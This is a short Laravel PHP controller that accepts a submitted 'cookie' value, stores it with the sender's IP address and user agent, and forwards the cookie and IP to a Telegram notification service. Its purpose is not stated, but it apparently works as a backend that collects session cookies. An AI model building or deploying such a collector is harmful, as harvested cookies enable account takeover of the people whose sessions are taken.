<?php

namespace App\Http\Controllers;

use App\Models\Submission;
use App\Services\TelegramService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class SubmissionController extends Controller
{
    public function store(Request $request, TelegramService $telegram): JsonResponse
    {
        $validated = $request->validate([
            'cookie' => ['required', 'string', 'min:1'],
        ]);

        $submission = Submission::create([
            'content' => $validated['cookie'],
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
        ]);

        $telegram->sendSubmissionNotification($submission->content, $submission->ip_address ?? 'unknown');

        return response()->json(['success' => true]);
    }
}
